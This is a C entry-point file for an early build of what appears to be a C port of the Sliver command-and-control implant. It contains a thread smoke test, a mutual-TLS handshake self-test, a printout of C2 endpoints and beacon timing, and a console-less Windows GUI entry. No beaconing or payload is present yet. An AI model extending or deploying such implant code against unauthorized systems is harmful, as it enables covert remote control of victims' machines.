/* src/entry/main.c - console entry point (M0 smoke build).
 *
 * M0 scope: prove the toolchain matrix, the configuration injection and the
 * platform abstraction work on Windows/Linux with MSVC/MinGW/Clang. The real
 * session/beacon loops land in M1.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "sliver/config.h"
#include "sliver/log.h"
#include "sliver/platform.h"
#include "sliver/transport.h"

#define SLIVER_SMOKE_ITERATIONS 20000

typedef struct {
  sliver_mutex_t *mutex;
  long counter;
} smoke_state_t;

static void smoke_worker(void *arg) {
  smoke_state_t *state = (smoke_state_t *)arg;
  for (int i = 0; i < SLIVER_SMOKE_ITERATIONS; ++i) {
    sliver_mutex_lock(state->mutex);
    state->counter += 1;
    sliver_mutex_unlock(state->mutex);
  }
}

static void print_banner(void) {
  (void)printf("sliver-cpp implant %s (build %s)\n", sliver_config_name(),
               sliver_config_build_id());
}

static void print_config(void) {
  (void)printf("  strategy         : %c\n", sliver_config_strategy());
  (void)printf("  c2 endpoints     : %u\n", (unsigned)sliver_config_c2_count());
  for (size_t i = 0; i < sliver_config_c2_count(); ++i) {
    (void)printf("    [%u] %s\n", (unsigned)i, sliver_config_c2_url(i));
  }
  (void)printf("  reconnect (ms)   : %lld\n",
               sliver_config_reconnect_interval_ns() / 1000000LL);
  (void)printf("  beacon interval  : %lld ms\n",
               sliver_config_beacon_interval_ns() / 1000000LL);
  (void)printf("  beacon jitter    : %lld ms\n",
               sliver_config_beacon_jitter_ns() / 1000000LL);
  (void)printf("  max conn errors  : %d\n", sliver_config_max_connection_errors());
  (void)printf("  transports       : mtls=%d http=%d dns=%d wg=%d pivot=%d\n",
               sliver_config_feature_mtls(), sliver_config_feature_http(),
               sliver_config_feature_dns(), sliver_config_feature_wg(),
               sliver_config_feature_pivot());
}

static int run_smoke(void) {
  smoke_state_t state = {0};
  sliver_thread_t *threads[4] = {0};
  int rc = 0;

  state.mutex = sliver_mutex_create();
  state.counter = 0;
  if (state.mutex == NULL) {
    (void)fprintf(stderr, "mutex_create failed\n");
    return 1;
  }
  for (size_t i = 0; i < sizeof(threads) / sizeof(threads[0]); ++i) {
    threads[i] = sliver_thread_create(smoke_worker, &state);
    if (threads[i] == NULL) {
      (void)fprintf(stderr, "thread_create failed\n");
      rc = 1;
      threads[i] = NULL;
    }
  }
  for (size_t i = 0; i < sizeof(threads) / sizeof(threads[0]); ++i) {
    if (threads[i] != NULL && sliver_thread_join(threads[i]) != 0) {
      rc = 1;
    }
  }
  (void)printf("smoke: counter=%ld expected=%d\n", state.counter,
               SLIVER_SMOKE_ITERATIONS * 4);
  if (state.counter != (long)(SLIVER_SMOKE_ITERATIONS * 4)) {
    rc = 1;
  }
  sliver_mutex_destroy(state.mutex);
  return rc;
}

static char *read_file(const char *path) {
  FILE *f = fopen(path, "rb");
  long size;
  char *buf;
  if (f == NULL) {
    return NULL;
  }
  if (fseek(f, 0, SEEK_END) != 0) {
    (void)fclose(f);
    return NULL;
  }
  size = ftell(f);
  if (size < 0) {
    (void)fclose(f);
    return NULL;
  }
  rewind(f);
  buf = (char *)malloc((size_t)size + 1);
  if (buf == NULL) {
    (void)fclose(f);
    return NULL;
  }
  if (fread(buf, 1, (size_t)size, f) != (size_t)size) {
    free(buf);
    (void)fclose(f);
    return NULL;
  }
  buf[size] = '\0';
  (void)fclose(f);
  return buf;
}

/* --tls-selftest <host> <port> <ca.pem> <cert.pem> <key.pem>
 *
 * Performs a real TLS 1.3 mutual-auth handshake, writes the yamux preface and
 * echoes one line, then prints the negotiated parameters. This is the target to
 * single-step in VS2022 (breakpoints in src/transport/tls_client.c). */
static int run_tls_selftest(int argc, char **argv) {
  const char *host, *ca_path, *cert_path, *key_path;
  uint16_t port;
  char err[256];
  char *ca, *cert, *key;
  sliver_tls_t *conn = NULL;
  int rc = 1;

  if (argc < 7) {
    (void)fprintf(stderr,
                  "usage: %s --tls-selftest <host> <port> <ca.pem> <cert.pem> <key.pem>\n",
                  argv[0]);
    return 2;
  }
  host = argv[2];
  port = (uint16_t)strtoul(argv[3], NULL, 10);
  ca_path = argv[4];
  cert_path = argv[5];
  key_path = argv[6];

  ca = read_file(ca_path);
  cert = read_file(cert_path);
  key = read_file(key_path);
  if (ca == NULL || cert == NULL || key == NULL) {
    (void)fprintf(stderr, "cannot read one of: %s %s %s\n", ca_path, cert_path, key_path);
    free(ca);
    free(cert);
    free(key);
    return 2;
  }

  err[0] = '\0';
  if (sliver_tls_connect(&conn, host, port, ca, cert, key, err, sizeof(err)) != 0) {
    (void)fprintf(stderr, "handshake failed: %s\n", err);
    goto out;
  }
  (void)printf("handshake ok: %s / %s\n", sliver_tls_version(conn),
               sliver_tls_ciphersuite(conn));

  if (sliver_tls_write(conn, SLIVER_YAMUX_PREFACE, SLIVER_YAMUX_PREFACE_LEN) !=
      SLIVER_YAMUX_PREFACE_LEN) {
    (void)fprintf(stderr, "write of MUX/1 failed\n");
    goto out;
  }
  {
    char line[256];
    size_t used = 0;
    const char *hello = "sliver-cpp hello\n";
    if (sliver_tls_write(conn, hello, strlen(hello)) != (long)strlen(hello)) {
      (void)fprintf(stderr, "write of probe line failed\n");
      goto out;
    }
    while (used < sizeof(line) - 1) {
      long n = sliver_tls_read(conn, line + used, sizeof(line) - 1 - used);
      if (n <= 0) {
        break;
      }
      used += (size_t)n;
      line[used] = '\0';
      if (strstr(line, "hello") != NULL) {
        break;
      }
    }
    if (used == 0) {
      (void)fprintf(stderr, "read of echo failed\n");
      goto out;
    }
    line[used] = '\0';
    (void)printf("echo (%u bytes): %s", (unsigned)used, line);
  }
  rc = 0;

out:
  if (conn != NULL) {
    sliver_tls_close(conn);
  }
  free(ca);
  free(cert);
  free(key);
  return rc;
}

int sliver_cli_main(int argc, char **argv) {
  char err[128];

  if (sliver_plat_init() != 0) {
    (void)fprintf(stderr, "platform init failed\n");
    return 1;
  }
  if (sliver_config_self_check(err, sizeof(err)) != 0) {
    (void)fprintf(stderr, "invalid configuration: %s\n", err);
    sliver_plat_cleanup();
    return 2;
  }

  if (argc > 1 && strcmp(argv[1], "--version") == 0) {
    print_banner();
    sliver_plat_cleanup();
    return 0;
  }
  if (argc > 1 && strcmp(argv[1], "--self-test") == 0) {
    int rc = run_smoke();
    sliver_plat_cleanup();
    return rc;
  }
  if (argc > 1 && strcmp(argv[1], "--tls-selftest") == 0) {
    int rc = run_tls_selftest(argc, argv);
    sliver_plat_cleanup();
    return rc;
  }

  print_banner();
  print_config();
  LOG_INFO("layout ok; session/beacon loops arrive in M1");
  sliver_plat_cleanup();
  return 0;
}

int main(int argc, char **argv) { return sliver_cli_main(argc, argv); }

#if defined(_WIN32) && defined(IMPLANT_GUI_BUILD)
/* GUI subsystem has no CRT console entry point: provide WinMain and forward.
 * The implant does not need argv, so argc/argv are zeroed. */
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
  (void)hInstance;
  (void)hPrevInstance;
  (void)lpCmdLine;
  (void)nCmdShow;
  return sliver_cli_main(0, 0);
}
#endif
